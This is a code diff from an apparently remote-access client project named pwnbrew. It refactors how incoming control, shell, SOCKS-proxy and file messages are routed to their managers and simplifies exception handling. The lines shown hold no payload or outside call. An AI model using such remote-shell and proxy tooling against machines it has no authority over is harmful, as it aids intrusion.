@@ -54,7 +54,6 @@ import java.util.Map;
 import java.util.logging.Level;
 import pwnbrew.ClientConfig;
 import pwnbrew.log.RemoteLog;
-import pwnbrew.log.LoggableException;
 import pwnbrew.utilities.SocketUtilities;
 import pwnbrew.network.ClientPortRouter;
 import pwnbrew.network.PortWrapper;
@@ -216,30 +215,16 @@ abstract public class DataManager {
                 //Pass the message to the right handler
                 switch( msgType ){            
                     case Message.CONTROL_MESSAGE_TYPE:
-
                         aManager = ControlMessageManager.getControlMessageManager();
-                        if( aManager == null){
-                            aManager = ControlMessageManager.initialize(theCommManager);
-                        }
                         break;
                     case Message.PROCESS_MESSAGE_TYPE:
-
                         aManager = ShellMessageManager.getShellMessageManager();
-                        if( aManager == null){
-                            aManager = ShellMessageManager.initialize(theCommManager);
-                        }
                         break;
                     case Message.SOCKS_MESSAGE_TYPE:
                         aManager = SocksMessageManager.getSocksMessageManager();
-                        if( aManager == null){
-                            aManager = SocksMessageManager.initialize(theCommManager);
-                        }
                         break;
                     case Message.FILE_MESSAGE_TYPE:
                         aManager = FileMessageManager.getFileMessageManager();
-                        if( aManager == null){
-                            aManager = FileMessageManager.initialize(theCommManager);
-                        }
                         break;            
                     default:
                         break;
@@ -252,7 +237,7 @@ abstract public class DataManager {
                 aManager.handleMessage( passedRouter, msgBytes );
             }
             
-        } catch (LoggableException | IOException ex) {
+        } catch (IOException ex) {
             RemoteLog.log(Level.INFO, NAME_Class, "routeMessage()", ex.getMessage(), ex );                                    
         }
     }
